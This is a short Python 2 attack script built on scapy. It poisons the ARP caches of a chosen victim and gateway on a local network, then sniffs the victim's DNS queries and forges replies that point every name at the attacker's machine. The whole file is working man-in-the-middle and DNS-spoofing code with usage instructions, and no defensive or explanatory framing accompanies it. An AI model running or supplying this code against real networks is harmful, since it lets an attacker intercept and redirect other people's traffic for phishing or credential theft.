#!/usr/bin/env python
# DNS poisoning attack! Relied on ARP poisoning attack MITM.
# Performs an ARP poisoning attacks against both victim and
# gateway (bidirectional ARP poisoning).
#
# Usage: arp-poisoning.py <IFACE> <VICTIM> <GATEWAY>
# Example: arp-poisoning.py wlan0 192.168.1.108 192.168.1.1

from scapy.all import *
from multiprocessing import Process
import os
import sys
import time

iface = sys.argv[1]
victim_host = sys.argv[2]
gateway = sys.argv[3]

local_mac = get_if_hwaddr(iface)
local_ip = get_if_addr(iface)

# A sloppy arp poisoning attack
def arp_poison():
	pkt = Ether()/ARP(op=2, hwdst =local_mac, psrc=gateway, pdst=victim_host)
	while True:
		sendp(pkt, verbose=0)
		time.sleep(5)

def dns_response(pkt):
	# DNS opcode of 0L is query!
	if DNS in pkt and pkt[DNS].opcode == 0L and pkt[DNS].ancount == 0:
		qname = pkt[DNSQR].qname
		print "DNS Question Record: " + qname
		reply = IP(dst=pkt[IP].src)\
			/UDP(dport=pkt[UDP].sport, sport=53) \
			/DNS(id=pkt[DNS].id, ancount=1, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=local_ip) \
			/DNSRR(rrname=qname, rdata=local_ip))
		send(reply, verbose=0)

pid = os.fork()

# Let child process perform arp cache poisoning
if pid == 0:
	arp_poison()
	exit()



sniff(iface=iface, filter="udp port 53 and host " + victim_host, prn=dns_response)


